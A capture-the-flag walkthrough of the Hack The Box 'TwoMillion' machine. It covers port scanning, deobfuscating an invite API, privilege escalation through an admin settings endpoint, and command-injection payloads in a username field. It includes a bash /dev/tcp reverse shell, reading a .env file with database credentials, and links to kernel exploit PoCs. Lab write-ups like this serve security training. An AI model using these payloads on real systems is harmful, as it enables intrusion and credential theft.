# TwoMillion

> References:
>
> - <https://s1ffx0.medium.com/hack-the-box-twomillion-walkthrough-a5b1a467067b>
> - <https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386>
> - <https://github.com/xkaneiki/CVE-2023-0386>

## Port Scanning

```bash
sudo nmap -vv -n -sS -T4 --top-ports 6000 10.10.11.221
sudo nmap -vv -sC -sV -T4 -A --top-ports 80 10.10.11.221
sudo nmap -vv -sC -sV -T4 -A --top-ports 80 2million.htb
```

Note that, we may need to add a reference to `/etc/hosts` so that we can access the website.

Results:

```txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
|_http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods:
|_  Supported Methods: GET
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.97%E=4%D=6/5%OT=22%CT=7%CU=44630%PV=Y%DS=2%DC=T%G=Y%TM=68426014
OS:%P=arm-apple-darwin24.4.0)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552S
OS:T11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)
...
```

## Investigation

First, take a look at the obfuscated `inviteapi.min.js`

```js
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    }
    ;
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }
        ];
        e = function() {
            return '\\w+'
        }
        ;
        c = 1
    }
    ;while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
```

There are online tools that can help us beautify the obfuscated JavaScript, such as [de4js](https://lelinhtinh.github.io/de4js/). Here is the readable version:

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

Let's call `makeInviteCode()`. The response result is pasted below:

```json
{
    "0": 200,
    "success": 1,
    "data": {
        "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
        "enctype": "ROT13"
    },
    "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Ok, we need to decode the string, which requires us to send a POST request to `/api/v1/invite/generate`

```bash
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
# In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Reuse `$.ajax` and send the request in the browser console:

```js
$.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/generate',
    success: function (response) {
        console.log(response)
    },
    error: function (response) {
        console.log(response)
    }
})
```

Here is the corresponding response:

```json
{
    "0": 200,
    "success": 1,
    "data": {
        "code": "TDRDVDktOE40TzctVk9NMDktVlEzOFE=",
        "format": "encoded"
    }
}
```

Obviously, the response contains a base64-encoded string. Decoding the string gives us the invite code

```bash
echo "TDRDVDktOE40TzctVk9NMDktVlEzOFE=" | base64 -d
# L4CT9-8N4O7-VOM09-VQ38Q
```

Now we can register an account with the obtained invite code. By the way, we can check if we can get the list of available API endpoints by visiting `http://2million.htb/api/v1`:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Try to update the settings of our newly registered account. I tried to use `$.ajax` to send the PUT request, but it always reported that "Missing parameter: email".

```js
$.ajax({
    type: "PUT",
    contentType: "application/json",
    data: {
        "is_admin": 1,
        "email": "test123@gmail.com"
    },
    url: '/api/v1/admin/settings/update',
    success: function(response) {
        console.log(response)
    },
    error: function(response) {
        console.log(response)
    }
})
```

Therefore, I switched to Postman to send the PUT request with Cookie ("PHPSESSID") being set correctly, which successfully modified our account to admin role. Then, we can start playing with `/api/v1/admin/vpn/generate` endpoint, which actually allows us to execute arbitrary commands.

```json
{
    "username": "test123; id #"
}
```

Response is as below:

```txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

Ok, we can create a reverse shell right now. I originally tried to use `nc -e /bin/bash` for this goal. Unfortunately, `nc` on the target machine does not have `-e` option. Therefore, we use `/dev/tcp` this time as below:

```json
{
    "username": "test123; bash -c 'bash -i >& /dev/tcp/$myip/$myport 0>&1' #"
}
```

Prior to the reverse shell, remember to run `nc -lnvp $myport` on your local machine. With `admin` permission, it is easy to obtain the flag in the admin user's home directory.

### SSH into the Box

Since the port 22 is open, can we ssh into the box alternatively? We can try to print out an interesting file `/var/wwwhtml/.env`

```json
{
    "username": "test123; cat ~/html/.env #"
}
```

Response:

```txt
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Then, we can try to reuse the password and ssh into the box. It is easier to interact with the target machine using ssh.

## CVE-2023-0386

Please download the exploit PoC from <https://github.com/xkaneiki/CVE-2023-0386>

## CVE-2023-4911

> <https://github.com/leesh3288/CVE-2023-4911>

- glibc 2.35
- `GLIBC_TUNABLES`

(TBD)
